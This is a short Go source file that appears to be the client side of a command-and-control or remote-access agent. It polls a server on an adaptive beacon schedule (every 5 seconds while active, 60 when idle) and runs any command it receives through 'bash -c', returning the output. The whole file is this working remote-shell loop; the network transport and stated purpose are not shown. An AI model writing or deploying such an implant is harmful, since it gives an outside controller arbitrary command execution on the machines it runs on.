package client

import (
	"fmt"
	"os"
	"os/exec"
	"time"
)

const sleepIdleTime = 60
const interactiveIdleTime = 5
const maxInteractiveIdleCount = 13 // 13 * 5 = 65 seconds BUT 0 is the first poll and omits waiting = 12 * 5 = 60 seconds

type clientCommandHandler struct {
	idleCounter int
}

func newClientCommandHandler() *clientCommandHandler {
	handler := clientCommandHandler{}
	handler.idleCounter = 0
	return &handler
}

func (c *clientCommandHandler) HandleCommand(value string, pollCallback func(), answerCallback func(string), exitCallback func()) {
	switch value {
	case "idle":
		c.Poll(pollCallback)
		break
	case "ok":
		c.idleCounter = 1
		c.Poll(pollCallback)
		break
	case "exit":
		c.Exit(exitCallback)
		break
	default:
		c.Answer(value, answerCallback)
	}
}
func (c *clientCommandHandler) Poll(callback func()) {
	c.sleep()
	c.idleCounter++
	callback()
}

func (c *clientCommandHandler) Answer(value string, callback func(string)) {
	c.idleCounter = 1
	output := c.executeCommand(value)
	if output == "" {
		output = "empty"
	}
	callback(output)
}
func (c *clientCommandHandler) Exit(callback func()) {
	callback()
	os.Exit(0)
}

func (c *clientCommandHandler) executeCommand(command string) string {
	cmd := exec.Command("bash", "-c", command)
	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println(err)
		return "command execution failed: " + err.Error()
	}
	return string(output)
}

func (c *clientCommandHandler) sleep() {
	if c.idleCounter == 0 {
		return //no sleep on first poll
	}
	if c.idleCounter >= maxInteractiveIdleCount {
		time.Sleep(sleepIdleTime * time.Second)
	} else {
		time.Sleep(interactiveIdleTime * time.Second)
	}
}
